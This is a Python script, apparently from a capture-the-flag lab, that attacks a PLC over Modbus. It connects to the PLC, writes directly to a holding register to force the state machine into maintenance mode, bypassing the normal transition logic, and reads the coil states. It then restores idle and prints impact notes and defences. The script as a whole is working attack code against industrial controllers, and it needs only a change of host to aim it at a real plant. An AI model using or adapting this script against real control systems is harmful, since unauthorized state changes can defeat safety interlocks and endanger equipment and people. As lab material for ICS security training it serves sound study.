#!/usr/bin/env python3
"""
State Machine Attack
CTF Challenge: Force PLC into maintenance mode

This script demonstrates manipulation of the PLC state machine
by directly writing to the state register, bypassing normal
state transition logic.
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def main():
    print("[State Machine Attack]")
    print("=" * 50)

    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)

    if not client.connect():
        print(f"❌ Failed to connect to PLC at {PLC_HOST}:{PLC_PORT}")
        return

    print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")

    state_names = {
        0: 'Idle',
        1: 'Starting',
        2: 'Running',
        3: 'Stopping',
        4: 'Emergency',
        5: 'Maintenance'
    }

    print("\n[Phase 1] Reading current state...")
    result = client.read_holding_registers(6, 1)
    if not result.isError():
        current_state = result.registers[0]
        print(f"  Current State: {current_state} ({state_names.get(current_state, 'Unknown')})")

    print("\n[Phase 2] Attempting to force maintenance mode...")
    print("  Writing state = 5 to holding register %MW6")

    client.write_register(6, 5)
    time.sleep(0.5)

    result = client.read_holding_registers(6, 1)
    if not result.isError():
        new_state = result.registers[0]
        print(f"  New State: {new_state} ({state_names.get(new_state, 'Unknown')})")

        if new_state == 5:
            print("\n🎯 CTF FLAG: State Machine Attack successful!")
            print("   PLC forced into maintenance mode")
            print("   Normal state machine logic bypassed")

    print("\n[Phase 3] Reading system status in maintenance mode...")
    result = client.read_coils(12, 4)
    if not result.isError():
        motor = result.bits[0]
        brake = result.bits[1]
        alert = result.bits[2]
        maintenance = result.bits[3]

        print(f"  Motor Running: {motor}")
        print(f"  Brake Engaged: {brake}")
        print(f"  Alert Active: {alert}")
        print(f"  Maintenance Mode: {maintenance}")

    print("\n[Phase 4] Restoring normal operation...")
    client.write_register(6, 0)  # Return to Idle state
    time.sleep(0.5)

    result = client.read_holding_registers(6, 1)
    if not result.isError():
        restored_state = result.registers[0]
        print(f"  Restored State: {restored_state} ({state_names.get(restored_state, 'Unknown')})")

    print("\n✓ Attack demonstration complete")
    print("\n[Impact Analysis]")
    print("  • Unauthorized state changes can bypass safety logic")
    print("  • Normal interlocks may not function in forced states")
    print("  • Operations team loses visibility into actual conditions")
    print("\n[Defensive Measures]")
    print("  1. Implement state change authentication")
    print("  2. Log all state transitions with source tracking")
    print("  3. Add state consistency checks")
    print("  4. Use separate safety PLC for critical functions")

    client.close()

if __name__ == '__main__':
    main()
